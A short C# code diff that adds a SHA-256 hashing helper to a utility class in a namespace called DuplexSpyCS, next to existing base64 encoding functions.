@@ -95,6 +95,17 @@ namespace DuplexSpyCS
             return plain_text;
         }
 
+        public static string fnSha256(string szPlain)
+        {
+            using (SHA256 sha256 = SHA256.Create())
+            {
+                byte[] abPlain = Encoding.UTF8.GetBytes(szPlain);
+                byte[] abHashed = sha256.ComputeHash(abPlain);
+
+                return BitConverter.ToString(abHashed).Replace("-", string.Empty).ToLower();
+            }
+        }
+
         public static string b64E2Str(string data) { return Convert.ToBase64String(Encoding.UTF8.GetBytes(data)); }
         public static string b64E2Str(byte[] data) { return Convert.ToBase64String(data); }
         public static byte[] b64E2Bytes(string data) { return Encoding.UTF8.GetBytes(b64E2Str(data)); }
